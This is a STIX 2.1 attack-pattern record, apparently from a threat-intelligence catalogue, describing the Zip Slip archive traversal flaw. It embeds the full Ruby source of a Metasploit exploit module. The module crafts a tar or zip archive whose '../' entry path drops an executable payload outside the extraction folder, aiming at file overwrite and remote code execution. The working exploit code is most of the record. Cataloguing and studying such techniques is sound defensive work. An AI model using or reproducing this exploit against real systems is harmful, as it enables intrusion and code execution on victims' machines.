{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--993e24fc-dce1-488a-9e91-4c68dc3bb471",
    "created": "2024-08-14T17:05:06.637301Z",
    "modified": "2024-08-14T17:05:06.637305Z",
    "name": "Generic Zip Slip Traversal Vulnerability",
    "description": " This is a generic arbitrary file overwrite technique, which typically results in remote command execution. This targets a simple yet widespread vulnerability that has been seen affecting a variety of popular products including HP, Amazon, Apache, Cisco, etc. The idea is that often archive extraction libraries have no mitigations against directory traversal attacks. If an application uses it, there is a risk when opening an archive that is maliciously modified, and result in the embedded payload to be written to an arbitrary location (such as a web root), and result in remote code execution.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/zip_slip.rb",
            "external_id": "zip_slip.rb"
        },
        {
            "source_name": "reference",
            "url": "https://snyk.io/research/zip-slip-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Generic Zip Slip Traversal Vulnerability',\n        'Description' => %q{\n          This is a generic arbitrary file overwrite technique, which typically results in remote\n          command execution. This targets a simple yet widespread vulnerability that has been\n          seen affecting a variety of popular products including HP, Amazon, Apache, Cisco, etc.\n          The idea is that often archive extraction libraries have no mitigations against\n          directory traversal attacks. If an application uses it, there is a risk when opening an\n          archive that is maliciously modified, and result in the embedded payload to be written\n          to an arbitrary location (such as a web root), and result in remote code execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'Snyk', # Technique discovery\n            'sinn3r', # Metasploit\n            'ggkitsas'\n          ],\n        'References' =>\n          [\n            ['URL', 'https://snyk.io/research/zip-slip-vulnerability']\n          ],\n        'DefaultOptions' =>\n          {\n            'EXITFUNC' => 'thread',\n            'DisablePayloadHandler' => true\n          },\n        'Platform' => ['linux', 'win', 'unix'],\n        'Targets' =>\n          [\n            ['Manually determined', {}]\n          ],\n        'Privileged' => false,\n        'DisclosureDate' => '2018-06-05'\n      )\n    )\n\n    register_options([\n      OptString.new('FILENAME', [true, 'The name of the archive file', 'msf.tar']),\n      OptEnum.new('FTYPE', [true, 'The archive type', 'tar', ['tar', 'zip'] ]),\n      OptString.new('TARGETPAYLOADPATH', [true, 'The targeted path for payload', '../payload.bin'])\n    ])\n  end\n\n  class ZipSlipArchive\n    attr_reader :data\n    attr_reader :fname\n    attr_reader :payload\n    attr_reader :type\n\n    def initialize(n, p, t)\n      @fname = n\n      @payload = p\n      @type = t\n      @data = make\n    end\n\n    def make\n      data = ''\n      path = Rex::FileUtils.normalize_unix_path(fname)\n\n      if type == 'tar'\n        contents = StringIO.new\n        Rex::Tar::Writer.new(contents) do |t|\n          t.add_file(path, 0o777) do |f|\n            f.write(payload)\n          end\n        end\n        contents.seek(0)\n        data = contents.read\n        contents.close\n        data\n      elsif type == 'zip'\n        zip = Rex::Zip::Archive.new\n        zip.add_file(path, payload)\n        data = zip.pack\n      end\n    end\n  end\n\n  def make_archive(target_payload_path, type)\n    elf = generate_payload_exe(code: payload.encoded)\n    archive = ZipSlipArchive.new(target_payload_path, generate_payload_exe, type)\n    archive.make\n  end\n\n  def exploit\n    target_payload_path = datastore['TARGETPAYLOADPATH']\n    unless target_payload_path.match(%r{\\.\\./})\n      print_error('Please set a traversal path')\n      return\n    end\n\n    archive = make_archive(target_payload_path, datastore['FTYPE'])\n    file_create(archive)\n    print_status('When extracted, the payload is expected to extract to:')\n    print_status(target_payload_path)\n  end\nend\n\n# A quick test:\n#\n# $ python\n# >>> import tarfile\n# >>> t = tarfile.open('test.tar')\n# >>> t.extractall()\n# >>> exit()\n#\n",
    "x_mitre_disclosure_date": "2018-06-05",
    "x_mitre_platforms": [
        "['linux', 'win', 'unix']"
    ]
}